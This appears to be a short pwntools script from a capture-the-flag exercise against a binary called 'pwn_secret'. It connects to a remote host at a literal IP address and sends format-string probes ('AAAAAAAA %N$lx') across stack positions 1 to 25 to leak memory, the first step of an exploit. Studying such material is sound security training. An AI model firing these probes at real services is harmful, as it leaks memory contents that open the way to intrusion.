#!/usr/bin/python
from pwn import *

context.log_level = 'critical'
HOST = "206.81.24.129"
PORT = 1339
BINARY = "./pwn_secret"

elf = ELF(BINARY)
libc = ELF('./libc-2.23.so')

for i in range(1, 26):
    p = remote(HOST, PORT)
    p.sendlineafter(': ', "AAAAAAAA %{}$lx".format(i))
    print("%02d: " % i + p.recvline()[:-1])
    p.close()

print('')